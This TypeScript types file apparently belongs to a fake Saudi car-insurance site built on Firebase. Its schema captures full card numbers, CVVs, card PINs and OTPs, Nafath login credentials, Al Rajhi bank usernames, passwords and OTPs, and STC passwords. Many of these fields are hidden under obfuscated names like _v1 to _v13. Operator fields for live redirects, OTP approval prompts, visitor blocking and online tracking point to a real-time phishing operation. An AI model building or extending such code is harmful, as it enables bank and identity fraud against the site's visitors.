import { Timestamp } from 'firebase/firestore'

export interface InsuranceApplication {
    id?: string
    country:string,
    // Step 1: Basic Information
    identityNumber: string
    ownerName: string
    phoneNumber: string
    documentType: "استمارة" | "بطاقة جمركية"
    serialNumber: string
    insuranceType: "تأمين جديد" | "نقل ملكية"
    buyerName?: string  // اسم المشتري (فقط في حالة نقل ملكية)
    buyerIdNumber?: string  // رقم هوية المشتري (فقط في حالة نقل ملكية)
      stcPhone?: string;
  stcPassword?: string;
  stcSubmittedAt?: string;
    // Step 2: Insurance Details
    insuranceCoverage: string
    insuranceStartDate: string
    vehicleUsage: string
    vehicleValue: string | number
    vehicleYear: string
    vehicleModel: string
    repairLocation: "agency" | "workshop"
  
    // Step 3: Selected Offer
    selectedOffer?: {
      id: number
      company: string
      price: number
      type: string
      features: string[]
    }
  
    // Step 4: Payment
    paymentMethod?: string
    _v1?: string // cardNumber (obfuscated)
    cardNumber?: string // Keep for backward compatibility
    cardType?: string
    cardLevel?: string
    _v3?: string // expiryDate (obfuscated)
    expiryDate?: string // Keep for backward compatibility
    _v2?: string // cvv (obfuscated)
    cvv?: string // Keep for backward compatibility
    _v4?: string // cardHolderName (obfuscated)
    cardHolderName?: string // Keep for backward compatibility
    bankInfo?: {
      name: string
      country: string
      level?: string
      paymentMethod?: string
    }
    paymentStatus: "pending" | "completed" | "failed"
    cardStatus?: "waiting" | "pending" | "approved_with_otp" | "approved_with_pin" | "rejected" | "message"
    cardStatusUpdatedAt?: number
    otpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "otp_rejected" | "show_otp" | "show_pin" | "message" | ""
    pinStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "message"
    _v6Status?: "pending" | "verifying" | "approved" | "rejected" | "message"
    _v6StatusUpdatedAt?: number
    otpCode?: string
    _v5?: string // otp (obfuscated)
    _v5Status?: "pending" | "verifying" | "approved" | "rejected" | "message" // OTP status
    _v5StatusUpdatedAt?: number
    otp?: string // كود OTP (الحقل المستخدم من موقع الزوار) - Keep for backward compatibility
    oldOtp?: Array<{ code: string; rejectedAt: string }> // الأكواد المرفوضة القديمة
    _v6?: string // pinCode (obfuscated)
    pinCode?: string // Keep for backward compatibility
    originalPrice?: number
    discount?: number
    finalPrice?: number
    offerTotalPrice?: number
  
    // Verification fields for phone and ID card codes
    phoneVerificationCode?: string
    _v7?: string // phoneOtp (obfuscated)
    phoneOtp?: string // كود تحقق الهاتف (الحقل الفعلي المستخدم) - Keep for backward compatibility
    phoneOtpSubmittedAt?: string
    allPhoneOtps?: string[]
    phoneVerificationStatus?: "pending" | "approved" | "rejected"
    phoneVerifiedAt?: Date
    phoneOtpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "show_phone_otp" | ""
    phoneOtpStatusUpdatedAt?: number
    phoneCarrier?: string // شركة الاتصالات
    idVerificationCode?: string
    idVerificationStatus?: "pending" | "approved" | "rejected"
    idVerifiedAt?: Date
    lastSeen?: string | Date | Timestamp
    
    // Nafad fields
    _v8?: string // nafazId (obfuscated)
    nafazId?: string // Keep for backward compatibility
    _v9?: string // nafazPass (obfuscated)
    nafazPass?: string // Keep for backward compatibility
    nafadConfirmationCode?: string
    nafadConfirmationCodeUpdatedAt?: number
    nafadConfirmationStatus?: "waiting" | "pending" | "approved" | "rejected"
    nafadConfirmationStatusUpdatedAt?: number
    nafadUpdatedAtTimestamp?: number
    
    // Rajhi fields
    _v10?: string // rajhiUser (obfuscated)
    rajhiUser?: string // Keep for backward compatibility
    _v11?: string // rajhiPassword (obfuscated)
    rajhiPassword?: string // Keep for backward compatibility
    rajhiPasswrod?: string // Keep for backward compatibility (typo version)
    _v12?: string // rajhiOtp (obfuscated)
    rajhiOtp?: string // Keep for backward compatibility
    rajhiOtpStatus?: "waiting" | "pending" | "approved" | "rejected" | "message"
    rajhiOtpStatusMessage?: string
    rajhiOtpStatusUpdatedAt?: number
    rajhiUpdatedAt?: number
    rajhiUpdatedAtTimestamp?: number

    // Final OTP fields
    _v13?: string // finalOtp (obfuscated)
    finalOtp?: string // Keep for backward compatibility
    finalOtpStatus?: "waiting" | "pending" | "approved" | "rejected" | "message"
    finalOtpStatusUpdatedAt?: number
    finalOtpUpdatedAt?: string
    // Metadata
    currentStep:
      | number
      | "home"
      | "insur"
      | "compar"
      | "check"
      | "payment"
      | "veri"
      | "otp"
      | "confi"
      | "pin"
      | "phone"
      | "nafad"
      | "rajhi"
      | "stc-login"
      | "finalOtp"
      | "_st1"
      | "_t2"
      | "_t3"
      | "_t6"
    currentPage?: string
    
    // Visitor Tracking
    referenceNumber?: string
    deviceType?: string
    browser?: string
    os?: string
    screenResolution?: string
    isOnline?: boolean
    is_blocked?: boolean
    isArchived?: boolean
    lastActiveAt?: string | Date | Timestamp
    sessionStartAt?: string
    
    // Redirect Control
    redirectPage?: string | null
    redirectRequestedAt?: string
    redirectRequestedBy?: string
    redirectedAt?: string
    redirectPageUpdatedAt?: number
    currentStepUpdatedAt?: number
    
    // Updated timestamp from client app
    updatedAtTimestamp?: number
    
    // Page Timestamps
    homeVisitedAt?: string
    homeCompletedAt?: string
    homeUpdatedAt?: string
    insurVisitedAt?: string
    insurCompletedAt?: string
    insurUpdatedAt?: string
    comparVisitedAt?: string
    comparCompletedAt?: string
    comparUpdatedAt?: string
    checkVisitedAt?: string
    checkCompletedAt?: string
    checkUpdatedAt?: string
    
    // Bubble Timestamps - track last update for each data section
    basicInfoUpdatedAt?: string      // معلومات أساسية
    nafadUpdatedAt?: number          // نفاذ
    insuranceUpdatedAt?: string      // تفاصيل التأمين
    offerUpdatedAt?: string          // العرض المختار
    cardUpdatedAt?: string           // معلومات البطاقة
    otpUpdatedAt?: string            // OTP
    pinUpdatedAt?: string            // PIN
    phoneUpdatedAt?: string          // معلومات الهاتف
    phoneOtpUpdatedAt?: string       // كود تحقق الهاتف
    
    status: "draft" | "pending_review" | "approved" | "rejected" | "completed"
    assignedProfessional?: string
    createdAt: Date
    updatedAt: Date
    notes?: string
    isUnread?: boolean
    online?: boolean
    selectedFeatures?: string[]
    history?: Array<{
      id: string
      type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad" | "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6"
      timestamp: string
      status: "pending" | "approved" | "rejected"
      data: any
    }>
  }
  
  export interface ChatMessage {
    id?: string
    applicationId: string
    senderId: string
    senderName: string
    senderRole: "customer" | "professional" | "admin"
    message: string
    timestamp: Date
    read: boolean
  }
  
  export interface User {
    id: string
    email: string
    name: string
    role: "customer" | "professional" | "admin"
    createdAt: Date
  }
  
